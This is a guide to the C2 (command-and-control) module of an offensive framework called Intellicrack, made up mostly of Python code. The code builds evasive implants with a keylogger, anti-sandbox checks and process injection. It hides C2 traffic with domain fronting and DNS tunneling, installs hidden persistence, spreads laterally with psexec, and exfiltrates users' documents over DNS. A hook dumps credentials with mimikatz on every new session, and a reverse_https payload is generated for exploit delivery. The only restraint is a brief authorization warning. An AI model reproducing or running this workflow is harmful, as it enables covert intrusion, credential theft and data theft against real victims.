# C2 Infrastructure Guide

## Overview

This guide covers Intellicrack's Command and Control (C2) infrastructure capabilities for penetration testing and red team operations. Learn to set up, manage, and operate C2 servers with advanced evasion techniques.

**WARNING**: This functionality is for authorized security testing only. Unauthorized use is illegal and unethical.

## Table of Contents

1. [C2 Architecture](#c2-architecture)
2. [Server Setup](#server-setup)
3. [Client Configuration](#client-configuration)
4. [Communication Protocols](#communication-protocols)
5. [Encryption and Security](#encryption-and-security)
6. [Operational Security](#operational-security)
7. [Management Interface](#management-interface)

## C2 Architecture

### Base C2 Framework

```python
from intellicrack.core.c2.base_c2 import BaseC2Server

# Initialize C2 server
c2_server = BaseC2Server(
    host="0.0.0.0",
    port=443,
    protocol="https"
)

# Configure server
c2_server.configure({
    "encryption": "AES-256-GCM",
    "authentication": "certificate",
    "logging": True,
    "stealth_mode": True
})

# Start server
c2_server.start()
```

### Multi-Protocol Support

```python
from intellicrack.core.c2.communication_protocols import (
    HTTPSProtocol,
    DNSProtocol,
    ICMPProtocol,
    WebSocketProtocol
)

# Configure multiple protocols
c2_server.add_protocol(HTTPSProtocol(port=443))
c2_server.add_protocol(DNSProtocol(port=53))
c2_server.add_protocol(WebSocketProtocol(port=8080))

# Enable protocol switching
c2_server.enable_protocol_switching(
    interval=300,  # Switch every 5 minutes
    randomize=True
)
```

## Server Setup

### Listener Configuration

```python
# Create HTTPS listener
https_listener = c2_server.create_listener(
    name="primary",
    protocol="https",
    port=443,
    ssl_cert="cert.pem",
    ssl_key="key.pem"
)

# Create DNS listener
dns_listener = c2_server.create_listener(
    name="backup",
    protocol="dns",
    port=53,
    domain="tunnel.example.com"
)

# Create custom listener
custom_listener = c2_server.create_custom_listener(
    name="stealth",
    handler=custom_protocol_handler,
    port=8443
)
```

### Infrastructure Setup

```python
# Configure redirectors
c2_server.add_redirector(
    host="redirector1.com",
    port=443,
    protocol="https"
)

# Configure domain fronting
c2_server.enable_domain_fronting(
    front_domain="cloudfront.net",
    actual_domain="c2.attacker.com"
)

# Set up load balancing
c2_server.configure_load_balancing([
    "c2-1.attacker.com",
    "c2-2.attacker.com",
    "c2-3.attacker.com"
])
```

## Client Configuration

### Client Generation

```python
from intellicrack.core.c2.c2_client import C2ClientGenerator

generator = C2ClientGenerator()

# Generate Windows client
windows_client = generator.generate_client(
    platform="windows",
    architecture="x64",
    protocols=["https", "dns"],
    server="c2.example.com",
    obfuscation=True
)

# Generate Linux client
linux_client = generator.generate_client(
    platform="linux",
    architecture="x64",
    protocols=["https"],
    persistence=True
)

# Generate staged payload
staged_payload = generator.generate_staged(
    stage1_size=500,  # Small initial stager
    delivery="powershell"
)
```

### Client Features

```python
# Configure client capabilities
client_config = {
    "commands": [
        "shell", "upload", "download", "screenshot",
        "keylogger", "persistence", "privesc"
    ],
    "intervals": {
        "beacon": 60,      # Beacon every 60 seconds
        "jitter": 20,      # +/- 20% jitter
        "sleep": 300       # Sleep 5 minutes on idle
    },
    "evasion": {
        "anti_sandbox": True,
        "anti_debug": True,
        "process_injection": True
    }
}

client = generator.build_client(client_config)
```

## Communication Protocols

### HTTP/HTTPS Communication

```python
from intellicrack.core.c2.protocols.http_protocol import HTTPProtocol

# Configure HTTP protocol
http_protocol = HTTPProtocol()
http_protocol.configure({
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "headers": {
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9"
    },
    "cookies": True,
    "compression": "gzip"
})

# Set up malleable profile
http_protocol.load_profile("amazon_browsing.profile")
```

### DNS Tunneling

```python
from intellicrack.core.c2.protocols.dns_protocol import DNSProtocol

# Configure DNS tunneling
dns_protocol = DNSProtocol()
dns_protocol.configure({
    "domain": "dns.tunnel.com",
    "record_types": ["TXT", "A", "AAAA"],
    "max_label_size": 63,
    "encoding": "base32"
})

# Enable DNS over HTTPS
dns_protocol.enable_doh(
    providers=["cloudflare", "google", "quad9"]
)
```

### Custom Protocols

```python
# Implement custom protocol
class SteganographyProtocol:
    def __init__(self):
        self.carrier_type = "image"
    
    def encode_message(self, message, carrier):
        # Hide message in image
        return stego_image
    
    def decode_message(self, carrier):
        # Extract message from image
        return message

# Register custom protocol
c2_server.register_protocol(
    "stego",
    SteganographyProtocol()
)
```

## Encryption and Security

### Encryption Manager

```python
from intellicrack.core.c2.encryption_manager import EncryptionManager

crypto = EncryptionManager()

# Generate keys
keys = crypto.generate_key_pair()

# Configure encryption
crypto.configure({
    "algorithm": "AES-256-GCM",
    "key_exchange": "ECDH",
    "signing": "RSA-PSS"
})

# Enable perfect forward secrecy
crypto.enable_pfs(
    rotation_interval=3600  # Rotate keys hourly
)
```

### Traffic Obfuscation

```python
# Enable traffic obfuscation
c2_server.enable_obfuscation({
    "method": "custom_xor",
    "key_rotation": True,
    "padding": "random"
})

# Add traffic shaping
c2_server.configure_traffic_shaping({
    "pattern": "normal_browsing",
    "burst_size": 1024,
    "rate_limit": 10240  # 10KB/s
})
```

## Operational Security

### OPSEC Features

```python
# Configure OPSEC settings
c2_server.configure_opsec({
    "kill_date": "2024-12-31",
    "working_hours": "09:00-17:00",
    "geofencing": {
        "allowed_countries": ["US", "CA"],
        "blocked_ips": ["10.0.0.0/8"]
    },
    "sandbox_detection": True
})

# Enable killswitch
c2_server.set_killswitch(
    trigger="domain_check",
    domain="killswitch.example.com"
)
```

### Log Management

```python
# Configure secure logging
c2_server.configure_logging({
    "level": "INFO",
    "encryption": True,
    "rotation": "daily",
    "retention": 7,  # days
    "remote_logging": {
        "enabled": True,
        "server": "log.secure.com",
        "protocol": "tls"
    }
})
```

## Management Interface

### Web Interface

```python
# Enable web management interface
from intellicrack.ui.dialogs.c2_management_dialog import C2ManagementDialog

web_ui = C2ManagementDialog()
web_ui.configure({
    "port": 8443,
    "ssl": True,
    "authentication": "certificate",
    "allowed_ips": ["127.0.0.1"]
})

web_ui.start()
```

### Command Line Interface

```python
# CLI management
from intellicrack.core.c2.c2_cli import C2CLI

cli = C2CLI(c2_server)

# List active sessions
sessions = cli.list_sessions()
for session in sessions:
    print(f"ID: {session['id']}")
    print(f"User: {session['user']}@{session['hostname']}")
    print(f"OS: {session['os']}")
    print(f"Last seen: {session['last_seen']}")

# Interact with session
cli.interact(session_id=1)
```

### Session Management

```python
# Get active session
session = c2_server.get_session(1)

# Execute commands
result = session.execute("whoami")
print(result)

# Upload file
session.upload(
    local_file="tool.exe",
    remote_path="C:\\Temp\\tool.exe"
)

# Download file
session.download(
    remote_path="C:\\Users\\target\\Documents\\secret.docx",
    local_file="loot/secret.docx"
)

# Take screenshot
screenshot = session.screenshot()
screenshot.save("screenshots/target_001.png")
```

## Advanced Features

### Persistence Mechanisms

```python
# Install persistence
session.install_persistence({
    "method": "registry",
    "backup_method": "scheduled_task",
    "hidden": True,
    "encrypted": True
})

# Multiple persistence methods
persistence_methods = [
    "registry_run",
    "scheduled_task",
    "wmi_event",
    "service",
    "com_hijack"
]

for method in persistence_methods:
    try:
        session.add_persistence(method)
        break
    except:
        continue
```

### Lateral Movement

```python
# Scan for targets
targets = session.scan_network(
    subnet="192.168.1.0/24",
    ports=[445, 3389, 22]
)

# Move laterally
for target in targets:
    if target['port_445_open']:
        session.psexec(
            target=target['ip'],
            payload=staged_payload
        )
```

### Data Exfiltration

```python
# Configure exfiltration
session.configure_exfil({
    "method": "dns",
    "chunk_size": 255,
    "compression": True,
    "encryption": True
})

# Exfiltrate data
session.exfiltrate(
    path="C:\\Users\\*\\Documents\\*.docx",
    priority="high"
)

# Monitor exfiltration progress
progress = session.get_exfil_progress()
print(f"Files queued: {progress['queued']}")
print(f"Bytes sent: {progress['bytes_sent']}")
```

## Best Practices

1. **Infrastructure Security**
   - Use redirectors and VPNs
   - Implement domain fronting
   - Rotate infrastructure regularly
   - Monitor for detection

2. **Client Security**
   - Obfuscate all payloads
   - Use process injection
   - Implement anti-analysis
   - Clean up artifacts

3. **Operational Security**
   - Use encryption everywhere
   - Implement killswitches
   - Log securely
   - Plan for compromise

4. **Legal Compliance**
   - Only use with authorization
   - Document all activities
   - Follow rules of engagement
   - Respect boundaries

## Troubleshooting

### Connection Issues

```python
# Debug connection problems
c2_server.enable_debug_mode()

# Test connectivity
test_result = c2_server.test_connection(
    client_ip="192.168.1.100",
    protocol="https"
)

if not test_result['success']:
    print(f"Error: {test_result['error']}")
    print(f"Suggestion: {test_result['suggestion']}")
```

### Performance Optimization

```python
# Optimize for scale
c2_server.optimize_for_scale({
    "max_sessions": 1000,
    "connection_pooling": True,
    "async_operations": True,
    "database": "postgresql"
})

# Monitor performance
stats = c2_server.get_performance_stats()
print(f"Active sessions: {stats['active_sessions']}")
print(f"CPU usage: {stats['cpu_usage']}%")
print(f"Memory usage: {stats['memory_usage']}MB")
```

## Integration Examples

### Integration with Exploitation Framework

```python
from intellicrack.core.exploitation.payload_engine import PayloadEngine

# Generate C2 payload
payload_engine = PayloadEngine()
c2_payload = payload_engine.generate(
    type="reverse_https",
    lhost="c2.example.com",
    lport=443,
    platform="windows",
    arch="x64"
)

# Deliver via exploit
exploit.set_payload(c2_payload)
exploit.execute()
```

### Automation Scripts

```python
# Automated post-exploitation
def auto_pwn(session):
    # Gather info
    session.sysinfo()
    session.execute("net user")
    session.execute("net localgroup administrators")
    
    # Dump credentials
    session.load_module("mimikatz")
    session.execute("privilege::debug")
    session.execute("sekurlsa::logonpasswords")
    
    # Persistence
    session.install_persistence()
    
    # Lateral movement prep
    session.scan_network("192.168.0.0/16")

# Apply to all new sessions
c2_server.on_new_session(auto_pwn)
```